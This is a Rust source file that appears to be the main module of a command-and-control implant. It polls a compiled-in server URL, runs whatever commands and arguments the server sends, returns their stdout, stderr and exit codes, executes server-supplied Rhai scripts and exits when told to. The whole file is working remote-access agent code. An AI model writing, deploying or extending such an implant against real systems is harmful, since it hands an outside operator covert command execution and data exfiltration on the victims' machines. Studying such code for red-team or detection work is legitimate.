pub mod agent;
pub mod network;
pub mod scripting;
pub mod state;

use scripting::ScriptingEngine;
use state::State;
use std::process::Output;
use std::sync::Arc;
use talaria::helper::*;
use talaria::protocol::*;
use tokio::process::Command;
use tokio::sync::RwLock;
use tokio::task;
use tokio::time::{self, Duration};
const URL: &'static str = env!("URL", "environment variable `URL` not defined");

const POLL_INTERVAL_MS: &'static str = env!(
    "POLL_INTERVAL_MS",
    "environment variable `POLL_INTERVAL_MS not defined"
);

#[tokio::main]
async fn main() {
    let state = State::new(
        URL,
        POLL_INTERVAL_MS.parse().expect("Invalid Polling Interval"),
    );

    let state = match state {
        Ok(state) => Arc::new(RwLock::new(state)),
        Err(err) => {
            devlog!("{}", err);
            panic!()
        }
    };

    let poll = task::spawn(poll(state.clone()));
    let _ = tokio::join!(poll);
}

async fn poll(state: Arc<RwLock<State>>) {
    let interval = state.read().await.get_polling_interval();
    let mut interval = time::interval(Duration::from_millis(interval));

    loop {
        interval.tick().await;

        let response = match state.write().await.get_pending_response() {
            Some(response) => response,
            None => (None, AgentResponseBody::Heartbeat),
        };

        let response = state.write().await.gen_response(response.1, response.0);
        let instruction = state.read().await.send_response(response).await;

        match instruction {
            Ok((ping, instruction)) => {
                devlog!("Got instruction: {:#?}", instruction);
                let _ = task::spawn(eval(state.clone()));
                state
                    .write()
                    .await
                    .push_instruction(instruction.body, instruction.header.packet_id);

                state.write().await.set_ping(ping);
            }
            Err(err) => {
                devlog!("Failed to properly communicate with server: {:#?}", err);
            }
        }
    }
}

async fn eval(state: Arc<RwLock<State>>) {
    let instruction = match state.write().await.get_pending_instruction() {
        Some(instruction) => instruction,
        None => return,
    };

    devlog!("Evaluating instruction: {:#?}", instruction);

    match instruction.1 {
        AgentInstructionBody::Command {
            ref command,
            ref args,
        } => {
            devlog!("Executing Command: {:?}, Args: {:?}", command, args);

            // Execute the received command with arguments
            let output: Output = Command::new(command).args(args).output().await.unwrap();

            // Capture stdout, stderr, and status code
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            let status_code = output.status.code().unwrap_or(-1); // Fallback to -1 if exit code is not available

            // Print the output for debugging
            devlog!("Command Output: \nSTDOUT: {}\nSTDERR: {}", stdout, stderr);

            let response_body = AgentResponseBody::CommandResponse {
                command: command.to_string(),
                status_code,
                stdout,
                stderr,
            };

            state
                .write()
                .await
                .push_response(response_body, instruction.0);
        }
        AgentInstructionBody::Script(script) => {
            let state_unmoved = state.clone();

            task::spawn_blocking(async move || {
                let mut engine = ScriptingEngine::new(state.clone()).await;
                engine.execute(&script.source).await;
            })
            .await;

            let response_body = AgentResponseBody::ScriptResponse;

            state_unmoved
                .write()
                .await
                .push_response(response_body, instruction.0);
        }
        AgentInstructionBody::Rhai(source) => {
            let state_unmoved = state.clone();

            task::spawn(async move {
                let mut engine = ScriptingEngine::new(state.clone()).await;
                engine.execute(&source).await;
            });

            let response_body = AgentResponseBody::ScriptResponse;

            state_unmoved
                .write()
                .await
                .push_response(response_body, instruction.0);
        }
        AgentInstructionBody::Kill => {
            std::process::exit(0);
        }
        AgentInstructionBody::Ok => {}
    }
}
